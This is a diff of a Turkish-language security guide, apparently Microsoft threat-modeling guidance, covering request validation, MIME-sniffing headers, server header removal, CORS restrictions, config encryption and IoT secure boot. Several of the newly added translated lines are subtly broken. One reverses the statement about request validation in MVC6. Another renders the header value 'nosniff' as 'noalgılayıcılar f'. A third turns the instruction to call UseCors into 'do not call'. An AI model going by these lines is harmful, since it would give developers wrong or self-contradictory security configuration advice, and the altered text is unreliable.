 | **Başvurular**              | [İstek Doğrulama - Betik Saldırılarını Önleme](https://www.asp.net/whitepapers/request-validation) |
-| **Adımlar** | <p>Sürüm 1.1'den bu yana ASP.NET özelliği olan istek doğrulaması, sunucunun kodlanmamış HTML içeren içeriği kabul etmesini engeller. Bu özellik, istemci komut dosyası kodu veya HTML bilmeden bir sunucuya gönderilebilir, saklanır ve daha sonra diğer kullanıcılara sunulan bazı komut dosyası enjeksiyon saldırıları önlemeye yardımcı olmak için tasarlanmıştır. Yine de tüm giriş verilerini doğrulamanızı ve uygun olduğunda HTML kodlamanızı şiddetle öneririz.</p><p>İstek doğrulama, tüm giriş verileri tehlikeli olabilecek değerler listesiyle karşılaştırılarak gerçekleştirilir. Bir eşleşme oluşursa, `HttpRequestValidationException`ASP.NET yükseltir. Varsayılan olarak, İstek Doğrulama özelliği etkinleştirilir.</p>|
+| **Adımlar** | <p>Sürüm 1,1 ' den bu yana bir ASP.NET özelliği olan istek doğrulaması, sunucunun kodlanmamış HTML içeren içeriği kabul etmesini engeller. Bu özellik, istemci betik kodu veya HTML 'nin bir sunucuya geri gönderilebildiği, depolandığı ve daha sonra diğer kullanıcılara sunulabildiği bazı betik ekleme saldırılarını önlemeye yardımcı olmak için tasarlanmıştır. Ayrıca, uygun olduğunda tüm giriş verilerini doğrulamanızı ve HTML 'in kodlanmasını kesinlikle öneririz.</p><p>İstek doğrulaması, tüm giriş verileri tehlikeli olabilecek değerler listesiyle karşılaştırılarak gerçekleştirilir. Bir eşleşme oluşursa, ASP.NET başlatır `HttpRequestValidationException`. Varsayılan olarak, Istek doğrulama özelliği etkindir.</p>|
 
 ### <a name="example"></a>Örnek
-Ancak, bu özellik sayfa düzeyinde devre dışı olabilir: 
+Ancak, bu özellik sayfa düzeyinde devre dışı bırakılabilir: 
 ```XML
 <%@ Page validateRequest="false" %> 
 ```
-veya, uygulama düzeyinde 
+veya uygulama düzeyinde 
 ```XML
 <configuration>
    <system.web>
@@ -191,32 +191,32 @@ veya, uygulama düzeyinde
    </system.web>
 </configuration>
 ```
-İstek Doğrulama özelliğinin desteklenmediğini ve MVC6 boru hattının bir parçası olmadığını lütfen unutmayın. 
+Istek doğrulama özelliğinin desteklenmediğini ve MVC6 işlem hattının bir parçası olduğunu lütfen unutmayın. 
 
-## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>JavaScript kitaplıklarının yerel olarak barındırılan en son sürümlerini kullanma
+## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>JavaScript kitaplıklarının yerel olarak barındırılan en son sürümlerini kullan
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
-| **Adımlar** | <p>JQuery gibi standart JavaScript kitaplıklarını kullanan geliştiriciler, bilinen güvenlik açıklarını içermeyen ortak JavaScript kitaplıklarının onaylı sürümlerini kullanmalıdır. Eski sürümlerinde bilinen güvenlik açıkları için güvenlik düzeltmeleri içerdiğinden, iyi bir uygulama kitaplıkların en son sürümünü kullanmaktır.</p><p>Uyumluluk nedeniyle en son sürüm kullanılamıyorsa, aşağıdaki minimum sürümler kullanılmalıdır.</p><p>Kabul edilebilir minimum sürümler:</p><ul><li>**Jquery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Doğrulama 1.9</li><li>JQuery Mobil 1.0.1</li><li>JQuery Döngüsü 2.99</li><li>JQuery Veri Tabloları 1.9.0</li></ul></li><li>**AJAX Denetim Araç Seti**<ul><li>Ajax Kontrol Araç Seti 40412</li></ul></li><li>**ASP.NET Web Formları ve Ajax**<ul><li>ASP.NET Web Forms ve Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Genel CDN'ler gibi harici sitelerden hiçbir JavaScript kitaplığı yüklemeyin</p>|
+| **Adımlar** | <p>JQuery gibi standart JavaScript kitaplıklarını kullanan geliştiriciler, bilinen güvenlik kusurlardan oluşan ortak JavaScript kitaplıklarının onaylanan sürümlerini kullanmalıdır. Daha eski sürümlerindeki bilinen güvenlik açıklarına yönelik güvenlik düzeltmeleri içerdiğinden, kitaplıkların en son sürümünü kullanmak iyi bir uygulamadır.</p><p>En son sürüm uyumluluk nedeniyle kullanılmıyorsa, aşağıdaki en düşük sürümler kullanılmalıdır.</p><p>Kabul edilebilir en düşük sürümler:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery doğrulaması 1,9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2,99</li><li>JQuery DataTable 1.9.0</li></ul></li><li>**AJAX Denetim Araç Seti**<ul><li>AJAX denetim araç seti 40412</li></ul></li><li>**ASP.NET Web Forms ve Ajax**<ul><li>ASP.NET Web Forms ve Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3,0</li></ul></li></ul><p>Genel CDNs gibi dış sitelerden hiçbir bir JavaScript kitaplığı yükleme</p>|
 
-## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Otomatik MIME koklamayı devre dışı
+## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Otomatik MIME algılaması 'nı devre dışı bırak
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [IE8 Güvenlik Bölüm V: Kapsamlı Koruma](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME tipi](https://en.wikipedia.org/wiki/Mime_type) |
-| **Adımlar** | X-İçerik Türü Seçenekleri üstbilgisi, geliştiricilerin içeriklerinin MIME koklanmaması gerektiğini belirtmelerine olanak tanıyan bir HTTP üstbilgidir. Bu üstbilgi, MIME Koklama saldırılarını azaltmak için tasarlanmıştır. Kullanıcı denetlenebilir içerik içerebilen her sayfa için HTTP Üstbilgi X İçerik Türü Seçenekleri:nosniff'i kullanmanız gerekir. Uygulamadaki tüm sayfalar için gerekli üstbilginin genel olarak etkin olmasını sağlamak için aşağıdakilerden birini yapabilirsiniz|
+| **Başvurular**              | [IE8 güvenlik bölümü V: kapsamlı koruma](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME türü](https://en.wikipedia.org/wiki/Mime_type) |
+| **Adımlar** | X-Content-Type-Options üst bilgisi, geliştiricilerin içeriklerinin MIME önlenmesini belirtmelerine izin veren bir HTTP başlığıdır. Bu üstbilgi, MIME algılaması saldırılarını azaltmak için tasarlanmıştır. Kullanıcı denetlenebilir içerik içerebilen her sayfa için, HTTP üstbilgisi X-Content-Type-Options: noalgılayıcılar f ' i kullanmanız gerekir. Gerekli üst bilgiyi uygulamadaki tüm sayfalar için genel olarak etkinleştirmek üzere aşağıdakilerden birini yapabilirsiniz|
 
 ### <a name="example"></a>Örnek
-Uygulama Internet Information Services (IIS) tarafından barındırılan 7 web.config dosyasına üstbilgi ekleyin. 
+Uygulama Internet Information Services (IIS) 7 ' den barındırılıyorsa, Web. config dosyasına üst bilgi ekleyin. 
 ```XML
 <system.webServer>
 <httpProtocol>
@@ -228,7 +228,7 @@ Uygulama Internet Information Services (IIS) tarafından barındırılan 7 web.c
 ```
 
 ### <a name="example"></a>Örnek
-Genel Uygulama\_BeginRequest üzerinden üstbilgi ekleme 
+Genel uygulama\_BeginRequest aracılığıyla üstbilgiyi ekleyin 
 ```csharp
 void Application_BeginRequest(object sender, EventArgs e)
 {
@@ -237,7 +237,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 ```
 
 ### <a name="example"></a>Örnek
-Özel HTTP modüllerini uygulayın 
+Özel HTTP modülünü Uygula 
 ```csharp
 public class XContentTypeOptionsModule : IHttpModule
 {
@@ -263,47 +263,47 @@ application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
 ```
 
 ### <a name="example"></a>Örnek
-Tek tek yanıtlara ekleyerek yalnızca belirli sayfalar için gerekli üstbilgiyi etkinleştirebilirsiniz: 
+Gerekli üstbilgiyi tek tek yanıtlara ekleyerek yalnızca belirli sayfalar için etkinleştirebilirsiniz: 
 
 ```csharp
 this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 ```
 
-## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Parmak izini almaktan kaçınmak için Windows Azure Web Sitelerindeki standart sunucu üstbilgilerini kaldırma
+## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Parmak izi oluşmasını önlemek için Windows Azure Web sitelerinde standart sunucu üstbilgilerini kaldırma
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
-| **Öznitelikler**              | EnvironmentType - Azure |
-| **Başvurular**              | [Windows Azure Web Sitelerindestandart sunucu üstbilgilerini kaldırma](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
-| **Adımlar** | Server, X-Powered-By, X-AspNet-Version gibi başlıklar sunucu ve temel teknolojiler hakkında bilgi ortaya çıkarır. Bu başlıkları bastırmak ve uygulamanın parmak izini önlemek için önerilir |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
+| **Öznitelikler**              | EnvironmentType-Azure |
+| **Başvurular**              | [Windows Azure Web sitelerinde standart sunucu üstbilgilerini kaldırma](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
+| **Adımlar** | Sunucu, X-destekli X-AspNet-Version gibi üstbilgiler, sunucu ve temel alınan teknolojiler hakkında bilgi açığa çıkar. Bu üst bilgilerin bastırılmasının, bu sayede uygulamanın parmak izi olarak yazdırılmasını engellemiş olması önerilir |
 
-## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Veritabanı Altyapısı erişimi için Windows Güvenlik Duvarı yapılandırma
+## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Veritabanı altyapısı erişimi için bir Windows Güvenlik Duvarı yapılandırma
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Veritabanı | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | SQL Azure, OnPrem |
-| **Öznitelikler**              | N/A, SQL Sürümü - V12 |
-| **Başvurular**              | [Azure SQL veritabanı güvenlik duvarı nasıl yapılandırılabilen](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/)veritabanı [altyapısı, Veritabanı Altyapısı Erişimi için Windows Güvenlik Duvarı Yapılandırma](https://msdn.microsoft.com/library/ms175043) |
-| **Adımlar** | Güvenlik duvarı sistemleri bilgisayar kaynaklarına yetkisiz erişimi önlemeye yardımcı olur. Bir güvenlik duvarı üzerinden SQL Server Database Engine bir örneğine erişmek için, erişim sağlamak için SQL Server çalıştıran bilgisayarda güvenlik duvarı yapılandırmanız gerekir |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | SQL Azure, Onprea |
+| **Öznitelikler**              | Yok, SQL sürümü-V12 |
+| **Başvurular**              | [Azure SQL veritabanı güvenlik duvarını yapılandırma](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [veritabanı altyapısı erişimi Için bir Windows Güvenlik Duvarı yapılandırma](https://msdn.microsoft.com/library/ms175043) |
+| **Adımlar** | Güvenlik duvarı sistemleri bilgisayar kaynaklarına yetkisiz erişimi önlemeye yardımcı olur. Bir güvenlik duvarı aracılığıyla SQL Server veritabanı altyapısının bir örneğine erişmek için, SQL Server çalıştıran bilgisayardaki güvenlik duvarını erişime izin verecek şekilde yapılandırmanız gerekir. |
 
-## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Cors Web API'ASP.NET etkinse yalnızca güvenilen kökenlere izin verildiğinden emin olun
+## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>ASP.NET Web API 'sinde CORS etkinse yalnızca güvenilir kaynaklardan izin verildiğinden emin olun
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web API | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | MVC 5 |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | MVC 5 |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | ASP.NET Web API 2, ASP.NET Web API'de [Origin'İstekleri Etkinleştirme](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api) [- ASP.NET Web API 2'de CORS Desteği](https://msdn.microsoft.com/magazine/dn532203.aspx) |
-| **Adımlar** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlama ya aynı kaynak ilkesi olarak adlandırılır ve kötü amaçlı bir sitenin başka bir siteden gelen hassas verileri okumasını engeller. Ancak, bazen diğer sitelerin tüketebileceği API'leri güvenli bir şekilde ortaya çıkarmak gerekebilir. Cross Origin Kaynak Paylaşımı (CORS), bir sunucunun aynı kaynak ilkesini gevşetmesine olanak tanıyan bir W3C standardıdır.</p><p>CORS'i kullanan sunucu, diğerlerini reddederken bazı kişiler arası isteklere açıkça izin verebilir. CORS, JSONP gibi önceki tekniklere göre daha güvenli ve daha esnektir.</p>|
+| **Başvurular**              | [ASP.NET Web API 2 ' de çapraz kaynak Isteklerini etkinleştirme](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API 2 ' de ASP.NET Web api-cors desteği](https://msdn.microsoft.com/magazine/dn532203.aspx) |
+| **Adımlar** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlamaya aynı-Origin ilkesi adı verilir ve kötü amaçlı bir sitenin başka bir siteden hassas verileri okumasını önler. Ancak bazen diğer sitelerin tüketebileceği API 'Leri güvenli hale getirmek gerekebilir. Çapraz kaynak kaynak paylaşımı (CORS), bir sunucunun aynı kaynak ilkeyi rahat bir şekilde sağlamasına olanak tanıyan bir W3C standardıdır.</p><p>CORS kullanarak, bir sunucu bazı çapraz kaynak isteklerine, diğerlerini reddetirken açık bir şekilde izin verebilir. CORS, JSONP gibi önceki tekniklerin daha güvenli ve daha esnektir.</p>|
 
 ### <a name="example"></a>Örnek
-App_Start/WebApiConfig.cs'de, WebApiConfig.Register yöntemine aşağıdaki kodu ekleyin 
+App_Start/WebApiConfig.cs, WebApiConfig. Register yöntemine aşağıdaki kodu ekleyin 
 ```csharp
 using System.Web.Http;
 namespace WebService
@@ -326,7 +326,7 @@ namespace WebService
 ```
 
 ### <a name="example"></a>Örnek
-EnableCors özniteliği aşağıdaki gibi bir denetleyicide eylem yöntemlerine uygulanabilir: 
+EnableCors özniteliği, denetleyicideki eylem yöntemlerine aşağıdaki gibi uygulanabilir: 
 
 ```csharp
 public class ResourcesController : ApiController
@@ -364,10 +364,10 @@ public class ResourcesController : ApiController
 }
 ```
 
-EnableCors özniteliğindeki kaynak listesinin sınırlı ve güvenilir bir menşe kümesine ayarlandığından emin olmak için önemli olduğunu lütfen unutmayın. Bunu uygunsuz bir şekilde yapılandırılamaması (örneğin, değeri '*' olarak ayarlamak), kötü amaçlı sitelerin herhangi bir kısıtlama olmaksızın API'ye çapraz kaynak isteklerini tetiklemesine >böylece API'yi CSRF saldırılarına karşı savunmasız hale getirir. EnableCors denetleyici düzeyinde dekore edilebilir. 
+Lütfen EnableCors özniteliğindeki çıkış listesinin sonlu ve güvenilir bir çıkış kümesine ayarlandığından emin olmak için kritik olduğunu unutmayın. Bu uygun olmayan yapılandırma (örn. değeri ' * ' olarak ayarlamak) kötü amaçlı sitelerin API 'ye çapraz kaynak isteklerini herhangi bir kısıtlama olmadan tetiklemesine olanak tanır >böylece API 'nin CSRF saldırılarına karşı savunmasız olmasına neden olur. EnableCors, denetleyici düzeyinde donatılmış olabilir. 
 
 ### <a name="example"></a>Örnek
-Bir sınıftaki belirli bir yöntemde CORS'u devre dışı kılabilir için, DisableCors özniteliği aşağıda gösterildiği gibi kullanılabilir: 
+Bir sınıftaki belirli bir yöntemde CORS 'yi devre dışı bırakmak için DisableCors özniteliği aşağıda gösterildiği gibi kullanılabilir: 
 ```csharp
 [EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
 public class ResourcesController : ApiController
@@ -392,16 +392,16 @@ public class ResourcesController : ApiController
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web API | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | MVC 6 |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | MVC 6 |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [ASP.NET Çekirdek 1.0'da Origin'ASP.NET İstekleri (CORS) etkinleştirme](https://docs.asp.net/en/latest/security/cors.html) |
-| **Adımlar** | <p>Core 1.0ASP.NETde CORS ara yazılım veya MVC kullanılarak etkinleştirilebilir. CORS'i etkinleştirmek için MVC kullanırken aynı CORS hizmetleri kullanılır, ancak CORS ara yazılımı kullanılmaz.</p>|
+| **Başvurular**              | [ASP.NET Core 1,0 ' de çıkış noktaları arası Istekleri (CORS) etkinleştirme](https://docs.asp.net/en/latest/security/cors.html) |
+| **Adımlar** | <p>ASP.NET Core 1,0 ' de, CORS, ara yazılım ya da MVC kullanılarak etkinleştirilebilir. CORS 'yi etkinleştirmek için MVC kullanılırken aynı CORS hizmetleri kullanılır, ancak CORS ara yazılımı değildir.</p>|
 
-**Yaklaşım-1** Ara yazılımla CORS'i etkinleştirme: Tüm uygulama için CORS'i etkinleştirmek için UseCors uzatma yöntemini kullanarak istek ardışık lığına CORS ara yazılımEkleyin. CorsPolicyBuilder sınıfını kullanarak CORS ara yazılımını eklerken bir çapraz orijin ilkesi belirtilebilir. Bunu yapmak için iki yol vardır:
+**Yaklaşım-1** Yazılım yardımıyla CORS 'yi etkinleştirme: uygulamanın tamamında CORS 'Yi etkinleştirmek Için, UseCors uzantı yöntemini kullanarak CORS ara hattını istek ardışık düzenine ekleyin. CorsPolicyBuilder sınıfı kullanılarak CORS ara yazılımı eklenirken bir çapraz kaynak ilkesi belirtilebilir. Bunu yapmak için iki yol vardır:
 
 ### <a name="example"></a>Örnek
-İlki usecors'u lambda ile aramak. Lambda bir CorsPolicyBuilder nesne alır: 
+Birincisi, bir lambda ile UseCors 'yi çağırmayın. Lambda bir CorsPolicyBuilder nesnesi alır: 
 ```csharp
 public void Configure(IApplicationBuilder app)
 {
@@ -413,7 +413,7 @@ public void Configure(IApplicationBuilder app)
 ```
 
 ### <a name="example"></a>Örnek
-İkincisi, bir veya daha fazla adlandırılmış CORS ilkeleri tanımlamak ve daha sonra çalışma zamanında ada göre ilke seçmektir. 
+İkincisi bir veya daha fazla adlandırılmış CORS ilkesini tanımlamak ve sonra çalışma zamanında ilkeyi ada göre seçer. 
 ```csharp
 public void ConfigureServices(IServiceCollection services)
 {
@@ -433,10 +433,10 @@ public void Configure(IApplicationBuilder app)
 }
 ```
 
-**Yaklaşım-2** MVC'de CORS'u etkinleştirme: Geliştiriciler alternatif olarak mvc'yi tüm denetleyiciler için eylem başına, denetleyici başına veya genel olarak belirli CORS'leri uygulamak için kullanabilir.
+**Yaklaşım-2** MVC 'de CORS 'yi etkinleştirme: geliştiriciler alternatif olarak, tüm denetleyiciler için eylem başına belirli CORS 'yi, denetleyici başına veya küresel olarak uygulamak için MVC 'yi kullanabilir.
 
 ### <a name="example"></a>Örnek
-Eylem başına: Belirli bir eylem için bir CORS ilkesi belirtmek için eyleme [EnableCors] özniteliği ekleyin. İlke adını belirtin. 
+Eylem başına: belirli bir eylem için bir CORS ilkesi belirtmek Için eyleme [EnableCors] özniteliğini ekleyin. İlke adını belirtin. 
 ```csharp
 public class HomeController : Controller
 {
@@ -456,7 +456,7 @@ public class HomeController : Controller
 ```
 
 ### <a name="example"></a>Örnek
-Genel: 
+Görünüm 
 ```csharp
 public void ConfigureServices(IServiceCollection services)
 {
@@ -467,10 +467,10 @@ public void ConfigureServices(IServiceCollection services)
     });
 }
 ```
-EnableCors özniteliğindeki kaynak listesinin sınırlı ve güvenilir bir menşe kümesine ayarlandığından emin olmak için önemli olduğunu lütfen unutmayın. Bunu uygunsuz bir şekilde yapılandırılamaması (örneğin, değeri '*' olarak ayarlamak), kötü amaçlı sitelerin herhangi bir kısıtlama olmaksızın API'ye çapraz kaynak isteklerini tetiklemesine >böylece API'yi CSRF saldırılarına karşı savunmasız hale getirir. 
+Lütfen EnableCors özniteliğindeki çıkış listesinin sonlu ve güvenilir bir çıkış kümesine ayarlandığından emin olmak için kritik olduğunu unutmayın. Bu uygun olmayan yapılandırma (örn. değeri ' * ' olarak ayarlamak) kötü amaçlı sitelerin API 'ye çapraz kaynak isteklerini herhangi bir kısıtlama olmadan tetiklemesine olanak tanır >böylece API 'nin CSRF saldırılarına karşı savunmasız olmasına neden olur. 
 
 ### <a name="example"></a>Örnek
-Bir denetleyici veya eylem için CORS'u devre dışı kullanabilirsiniz, [Devre Dışı Korenler] özniteliğini kullanın. 
+Bir denetleyici veya eylem için CORS 'yi devre dışı bırakmak için [DisableCors] özniteliğini kullanın. 
 ```csharp
 [DisableCors]
     public IActionResult About()
@@ -479,140 +479,140 @@ Bir denetleyici veya eylem için CORS'u devre dışı kullanabilirsiniz, [Devre 
     }
 ```
 
-## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Web API'nin yapılandırma dosyalarının hassas veriler içeren bölümlerini şifreleme
+## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Web API 'sinin gizli verileri içeren yapılandırma dosyalarının bölümlerini şifreleyin
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web API | 
-| **SDL Fazı**               | Dağıtım |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **SDL aşaması**               | Dağıtım |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [Nasıl İşlenir: ASP.NET 2.0'da Yapılandırma Bölümlerini DPAPI Kullanarak Şifreleme](https://msdn.microsoft.com/library/ff647398.aspx), [Korumalı Yapılandırma Sağlayıcısı Belirtme](https://msdn.microsoft.com/library/68ze1hb2.aspx), Uygulama sırlarını korumak için Azure Key [Vault'u Kullanma](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
-| **Adımlar** | Web.config, appsettings.json gibi yapılandırma dosyaları genellikle kullanıcı adları, parolalar, veritabanı bağlantı dizeleri ve şifreleme anahtarları gibi hassas bilgileri tutmak için kullanılır. Bu bilgileri korumazsanız, uygulamanız saldırganlara veya hesap kullanıcı adları ve parolalar, veritabanı adları ve sunucu adları gibi hassas bilgileri alan kötü niyetli kullanıcılara karşı savunmasızdır. Dağıtım türüne (azure/on-prem) bağlı olarak, DPAPI veya Azure Key Vault gibi hizmetleri kullanarak config dosyalarının hassas bölümlerini şifreleyin. |
+| **Başvurular**              | [Nasıl yapılır: ASP.NET 2,0 ' de yapılandırma bölümlerini](https://msdn.microsoft.com/library/ff647398.aspx), [bir korumalı yapılandırma sağlayıcısı belirterek](https://msdn.microsoft.com/library/68ze1hb2.aspx), [uygulama gizli dizilerini korumak için Azure Key Vault kullanarak](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) şifreleme |
+| **Adımlar** | Web. config, appSettings. JSON gibi yapılandırma dosyaları genellikle kullanıcı adları, parolalar, veritabanı bağlantı dizeleri ve şifreleme anahtarları dahil olmak üzere hassas bilgileri tutmak için kullanılır. Bu bilgileri korumayın, uygulamanız saldırganların veya kötü niyetli kullanıcıların hesap Kullanıcı adları ve parolalar, veritabanı adları ve sunucu adları gibi hassas bilgileri elde etmesine açıktır. Dağıtım türüne (Azure/on-Prem) bağlı olarak, yapılandırma dosyalarının hassas bölümlerini, DPAPI veya Azure Key Vault gibi hizmetleri kullanarak şifreleyin. |
 
 ## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Tüm yönetici arabirimlerinin güçlü kimlik bilgileriyle güvenli olduğundan emin olun
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
-| **Bileşen**               | IoT Cihazı | 
-| **SDL Fazı**               | Dağıtım |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **Bileşen**               | IoT cihazı | 
+| **SDL aşaması**               | Dağıtım |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
-| **Adımlar** | Aygıtın veya alan ağ geçidinin ortaya çıkardığı tüm yönetim arabirimleri güçlü kimlik bilgileri kullanılarak güvenli olmalıdır. Ayrıca, WiFi, SSH, Dosya paylaşımları, FTP gibi diğer maruz arayüzler güçlü kimlik bilgileri ile güvenli olmalıdır. Varsayılan zayıf parolalar kullanılmamalıdır. |
+| **Adımlar** | Cihazın veya alan ağ geçidinin açığa çıkardığı tüm yönetim arabirimleri, güçlü kimlik bilgileri kullanılarak güvenli hale gelmelidir. Ayrıca, WiFi, SSH, dosya paylaşımları, FTP gibi diğer tüm sunulan arabirimler, güçlü kimlik bilgileriyle güvenli hale gelmelidir. Varsayılan zayıf parolalar kullanılmamalıdır. |
 
-## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Bilinmeyen kodun aygıtlarda yürütülmediğinden emin olun
+## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Bilinmeyen kodun cihazlarda yürütülemez olduğundan emin olun
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
-| **Bileşen**               | IoT Cihazı | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **Bileşen**               | IoT cihazı | 
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [Windows 10 IoT Core'da Güvenli Önyükleme ve bit-locker Aygıt Şifrelemesini etkinleştirme](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
-| **Adımlar** | UEFI Secure Boot, sistemi yalnızca belirli bir makam tarafından imzalanmış ikili lerin yürütülmesine izin vermek için kısıtlar. Bu özellik, bilinmeyen kodun platformda yürütülmesini önler ve kodun güvenlik duruşunu zayıflatma potansiyeline sahiptir. UEFI Güvenli Önyükleme'yi etkinleştirin ve kod imzalaması için güvenilen sertifika yetkilileri listesini kısıtlayın. Güvenilir yetkililerden birini kullanarak aygıtta dağıtılan tüm kodları imzalayın. |
+| **Başvurular**              | [Windows 10 IoT Core 'da güvenli önyükleme ve bit dolabı cihaz şifrelemesini etkinleştirme](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
+| **Adımlar** | UEFı güvenli önyükleme, sistemi yalnızca belirtilen bir yetkili tarafından imzalanan ikililerin yürütülmesine izin verecek şekilde kısıtlar. Bu özellik, platformda bilinmeyen kodun yürütülmesini ve potansiyel olarak weakening güvenlik durmasını önler. UEFı güvenli önyüklemeyi etkinleştirin ve kod imzalama için güvenilen sertifika yetkililerinin listesini kısıtlayın. Güvenilir yetkililerinden birini kullanarak cihaza dağıtılan tüm kodu imzalayın. |
 
-## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>IoT Cihazının işletim sistemi ve ek bölümlerini bit dolabı ile şifreleme
-
-| Başlık                   | Ayrıntılar      |
-| ----------------------- | ------------ |
-| **Bileşen**               | IoT Cihazı | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
-| **Öznitelikler**              | Yok  |
-| **Başvurular**              | Yok  |
-| **Adımlar** | Windows 10 IoT Core, gerekli ölçümleri gerçekleştiren UEFI'de gerekli preOS protokolü de dahil olmak üzere platformda bir TPM varlığına güçlü bir bağımlılığa sahip bit dolabı Aygıt Şifrelemesinin hafif bir sürümünü uygular. Bu preOS ölçümleri, işletim sistemi daha sonra işletim sistemi başlatıldı nasıl kesin bir kayıt olmasını sağlar. Bit dolabı nı ve herhangi bir ek bölümü kullanarak işletim sistemi bölümlerini şifreleyin, ayrıca hassas verileri depolamaları durumunda. |
-
-## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Cihazlarda yalnızca minimum hizmetlerin/özelliklerin etkin olduğundan emin olun
+## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Bit dolabı ile işletim sistemi ve IoT cihazının ek bölümlerini şifreleme
 
 | Başlık                   | Ayrıntılar      |
